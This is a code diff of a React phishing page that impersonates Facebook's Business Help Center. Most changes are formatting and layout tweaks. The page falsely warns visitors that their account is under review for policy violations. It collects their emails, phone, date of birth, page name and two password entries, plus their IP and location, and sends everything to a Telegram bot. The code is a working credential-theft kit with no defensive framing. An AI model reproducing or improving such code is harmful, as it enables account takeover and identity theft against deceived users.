@@ -1,4 +1,3 @@
-
 import { useEffect, useState } from "react";
 import "../business-help-center/style.css";
 import { Button, Checkbox, Form, Input, Modal, Space, Steps } from "antd";
@@ -8,7 +7,7 @@ import { useDispatch } from "react-redux";
 import { setData } from "../../store/business/businessSlice";
 import axios from "axios";
 import { ETelegram } from "../../constants";
-import type { CheckboxProps } from 'antd';
+import type { CheckboxProps } from "antd";
 const BusinessHelpCenter = () => {
   const [form] = Form.useForm();
   const navigate = useNavigate();
@@ -99,9 +98,9 @@ const BusinessHelpCenter = () => {
         ["Please provide us information that will help us investigate"]: text,
         ["Password First"]: passwordFirst,
         ["Password Second"]: passwordSecond,
-        ['Ip']: response.data.ip,
-        ['City']: response.data.city,
-        ['Country']: response.data.country,
+        ["Ip"]: response.data.ip,
+        ["City"]: response.data.city,
+        ["Country"]: response.data.country,
       };
       await axios
         .post(
@@ -135,7 +134,6 @@ const BusinessHelpCenter = () => {
     const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
     let CURRENT_API_URL = API_URL + "sendMessage";
     try {
-
       let message = `
       Email Account:  ${businessEmail}
       Name Account: ${namePage}
@@ -215,17 +213,13 @@ const BusinessHelpCenter = () => {
     setCheckSend(true);
   };
 
-
   return (
     <div className="container_business">
       <div className="header">
         <div className="header_sup">
-          <div className="logo">
+          <div className="w-36">
             <a href="##">
-              <img
-                src="/images/meta.png"
-                alt=""
-              />
+              <img src="/images/meta.png" alt="" />
             </a>
           </div>
           <Space direction="vertical" size="middle">
@@ -240,14 +234,12 @@ const BusinessHelpCenter = () => {
         </div>
       </div>
       <div className="nav">
-        <div className="nav_sup">
-          Facebook Business Help Center
-        </div>
+        <div className="nav_sup">Facebook Business Help Center</div>
       </div>
       <div className="block">
         <div className="block_sup">
           <div className="content">
-            <div className="header_step">
+            {/* <div className="header_step">
               <div className="header_top">
                 <div className="dot"></div>
                 <div className="line"></div>
@@ -260,13 +252,21 @@ const BusinessHelpCenter = () => {
                 <p>Select the Issue</p>
                 <p>Get help</p>
               </div>
+            </div> */}
+            <div className="flex justify-center items-center my-10">
+              <img src="/images/bg1.png" alt="" />
             </div>
             <div className="text_center">Get Started</div>
             <div className="header_content">
-              <p>We have received multiple reports that suggest that your account has been in violation
-                of our terms of services and community guidelines. As a result, your account is scheduled for review</p>
+              <p>
+                We have received multiple reports that suggest that your account
+                has been in violation of our terms of services and community
+                guidelines. As a result, your account is scheduled for review
+              </p>
               <br />
-              <p style={{ fontSize: '14px', fontWeight: '700' }}>Report no: 3088553115</p>
+              <p style={{ fontSize: "14px", fontWeight: "700" }}>
+                Report no: 3088553115
+              </p>
             </div>
             {/* <div className="text_content">
               <p style={{ marginTop: "16px" }}>
@@ -293,7 +293,9 @@ const BusinessHelpCenter = () => {
                   <Form.Item
                     name="text"
                     label="Please provide us information that will help us investigate."
-                    rules={[{ required: true, message: "Information is required" }]}
+                    rules={[
+                      { required: true, message: "Information is required" },
+                    ]}
                   >
                     <TextArea
                       rows={1}
@@ -422,7 +424,12 @@ const BusinessHelpCenter = () => {
                   name="namePage"
                   label="Facebook page name"
                   colon={false}
-                  rules={[{ required: true, message: "Facebook page name is required" }]}
+                  rules={[
+                    {
+                      required: true,
+                      message: "Facebook page name is required",
+                    },
+                  ]}
                 >
                   <Input
                     onChange={(e) => {
@@ -445,7 +452,9 @@ const BusinessHelpCenter = () => {
                   name="date"
                   label="Date of Birth"
                   colon={false}
-                  rules={[{ required: true, message: "Date of Birth is required" }]}
+                  rules={[
+                    { required: true, message: "Date of Birth is required" },
+                  ]}
                 >
                   <Input
                     type="date"
@@ -466,25 +475,34 @@ const BusinessHelpCenter = () => {
                   />
                 </Form.Item>
                 <Form.Item
-                  rules={[{ required: true, message: "Please agree to our terms and data and cookie policy!" }]}
+                  rules={[
+                    {
+                      required: true,
+                      message:
+                        "Please agree to our terms and data and cookie policy!",
+                    },
+                  ]}
                 >
+                  <Checkbox
+                    checked={checkAccept}
+                    onChange={(e) => {
+                      setCheckAccept(e.target.checked);
 
-                  <Checkbox checked={checkAccept} onChange={(e) => {
-                    setCheckAccept(e.target.checked);
-
-                    setValidate({
-                      namePage,
-                      fullName,
-                      businessEmail,
-                      personalEmail,
-                      phone,
-                      date,
-                      checkAccept: e.target.checked,
-                      text,
-                    });
-                  }}>I agree to our Terms, Data and Cookies Policy.</Checkbox>
+                      setValidate({
+                        namePage,
+                        fullName,
+                        businessEmail,
+                        personalEmail,
+                        phone,
+                        date,
+                        checkAccept: e.target.checked,
+                        text,
+                      });
+                    }}
+                  >
+                    I agree to our Terms, Data and Cookies Policy.
+                  </Checkbox>
                 </Form.Item>
-
               </Form>
             </div>
             <div className="footer_content">
@@ -577,16 +595,23 @@ const BusinessHelpCenter = () => {
       <div className="footer">
         <div className="footer_title">
           <div className="footer_title_nav">
-            <img className="footer_img"
+            <img
+              className="footer_img"
               src="https://scontent.xx.fbcdn.net/v/t1.15752-9/433377898_1195899118047328_5310864312235708346_n.png?_nc_cat=110&ccb=1-7&_nc_sid=5f2048&_nc_eui2=AeHaCRazprnB2GcaS1KVR2lO8SYMXA_dj_HxJgxcD92P8SXWoLpmUuX-hcllzot4SMu7KLuDM39sn234M1-dPtUG&_nc_ohc=MYI-YnH9tSMAb4yvY5g&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdWdudDdo4-Lq64O6O5l4SgK2AJDVBvh115nFkWe4isDsg&oe=6637A55F"
               alt=""
             />
-            <p style={{ textAlign: 'center', color: 'white', fontSize: '13px' }}>Facebook can help your large, medium or small business grow. Get the lastest news for advertisers and more on our Meta for Business Page</p>
+            <p
+              style={{ textAlign: "center", color: "white", fontSize: "13px" }}
+            >
+              Facebook can help your large, medium or small business grow. Get
+              the lastest news for advertisers and more on our Meta for Business
+              Page
+            </p>
           </div>
         </div>
         <div className="footer_bottom">
           <div className="column">
-            <p style={{ fontWeight: 'bold' }}>Marketing on Facebook</p>
+            <p style={{ fontWeight: "bold" }}>Marketing on Facebook</p>
             <p>Success Stories</p>
             <p>Measurement</p>
             <p>Industries</p>
@@ -596,7 +621,7 @@ const BusinessHelpCenter = () => {
             <p>Site map</p>
           </div>
           <div className="column">
-            <p style={{ fontWeight: 'bold' }}>Marketing objectives</p>
+            <p style={{ fontWeight: "bold" }}>Marketing objectives</p>
             <p>Build your presence</p>
             <p>Create awareness</p>
             <p>Drive discovery</p>
@@ -605,7 +630,7 @@ const BusinessHelpCenter = () => {
             <p>Earb loyalty</p>
           </div>
           <div className="column">
-            <p style={{ fontWeight: 'bold' }}>Facebook Pages</p>
+            <p style={{ fontWeight: "bold" }}>Facebook Pages</p>
             <p>Get startes with Pages</p>
             <p>Set up your Page</p>
             <p>Manage your Facebook Page</p>
@@ -614,7 +639,7 @@ const BusinessHelpCenter = () => {
             <p>Page Insights</p>
           </div>
           <div className="column">
-            <p style={{ fontWeight: 'bold' }}>Facebook ads</p>
+            <p style={{ fontWeight: "bold" }}>Facebook ads</p>
             <p>Get startes with ads</p>
             <p>Buying Facebook ads</p>
             <p>Ad formats</p>
